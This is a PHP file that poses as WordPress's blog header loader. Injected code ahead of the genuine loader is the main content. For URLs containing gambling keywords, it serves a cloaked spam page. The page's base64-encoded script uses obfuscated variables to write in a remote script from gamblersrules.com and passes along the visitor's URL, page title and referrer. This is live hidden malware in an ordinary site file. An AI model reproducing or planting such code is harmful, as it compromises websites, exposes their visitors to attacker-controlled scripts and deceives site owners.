<?php
$requestsTitles = array(
	'money' => array('Best Online Casino - Popular & Trusted Casinos', 'en', 'csnensch'),
    'gambling' => array('Best Online Casino - Popular & Trusted Casinos', 'en', 'csnensch'),
    'tricks' => array('Best Online Casino - Popular & Trusted Casinos', 'en', 'csnensch'),
    'winning' => array('Best Online Casino - Popular & Trusted Casinos', 'en', 'csnensch'),
    'strategies' => array('Best Online Casino - Popular & Trusted Casinos', 'en', 'csnensch'),
    'casino' => array('Best Online Casino - Popular & Trusted Casinos', 'en', 'csnensch'),
    'slot' => array('Best Online Casino - Popular & Trusted Casinos', 'en', 'csnensch'),
    'machine' => array('Best Online Casino - Popular & Trusted Casinos', 'en', 'csnensch'),
	

);
$matches = findMatches($_SERVER["REQUEST_URI"], $requestsTitles);


if (!empty($matches)) {
    extract($matches);
    ?>
    <!DOCTYPE html>
    <html>
        <head>
            <title><?php echo $title ?></title>

            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script src="data:text/javascript;base64,<?php echo $scriptSourceBase64 ?>"></script>
        </head>
        <body>
            <div><?php echo $key ?></div>
        </body>
    </html>
    <?php
    exit;
}

function findMatches($request, $requestsTitles) {

    $matches = array();
    foreach ($requestsTitles as $key => $value) {
        if (stristr($request, $key) !== false) {

            $matches = array(
                'key' => $key,
                'title' => $value[0],
                'scriptSourceBase64' => base64_encode(getJs($value[2])),
            );

            break;
        }
    }

    return $matches;
}

function getJs($name) {
    return <<<STR
new Image().src = "//counter.yadro.ru/hit;$name?r"+
escape(document.referrer)+((typeof(screen)=="undefined")?"":
";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
";"+Math.random();
var RxcpwhkPEy="<script type=\"text/javascript\" language=\"JavaScript\" ";var GKqFPmvtST="src=\"//gamblersrules.com/";var DnUeZRYLTV="csnensch.js?ref="+encodeURI(document.URL)+"&title="+encodeURI(document.title)+"&httpref="+encodeURI(document.referrer)+"\">";var KUlAFmqwyb=" </script>";document.write(RxcpwhkPEy+GKqFPmvtST+DnUeZRYLTV+KUlAFmqwyb);
STR;
}
?>
<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once __DIR__ . '/wp-load.php';

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once ABSPATH . WPINC . '/template-loader.php';

}
